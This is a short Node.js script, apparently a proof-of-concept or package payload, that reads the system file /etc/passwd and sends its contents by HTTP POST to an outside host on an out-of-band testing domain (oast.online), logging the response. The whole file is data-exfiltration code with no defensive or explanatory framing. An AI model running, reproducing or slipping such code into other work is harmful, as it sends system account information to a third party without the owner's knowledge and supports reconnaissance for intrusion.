const fs = require('fs');
const http = require('http');

// Read /etc/passwd file
const passwdContent = fs.readFileSync('/etc/passwd', 'utf8');

// Send the content to a remote server
const options = {
  hostname: 'd1rpavt9d1ot5fl43rb0ubkt4nwzjpkag.oast.online',
  port: 80,
  path: '/receive',
  method: 'POST'
};

const req = http.request(options, (res) => {
  console.log(`STATUS: ${res.statusCode}`);
  console.log(`HEADERS: ${JSON.stringify(res.headers)}`);
  res.setEncoding('utf8');
  res.on('data', (chunk) => {
    console.log(`BODY: ${chunk}`);
  });
  res.on('end', () => {
    console.log('No more data...');
  });
});

req.on('error', (e) => {
  console.error(`PROBLEM WITH REQUEST: ${e.message}`);
});

req.write(`Content: ${passwdContent}`);
req.end();
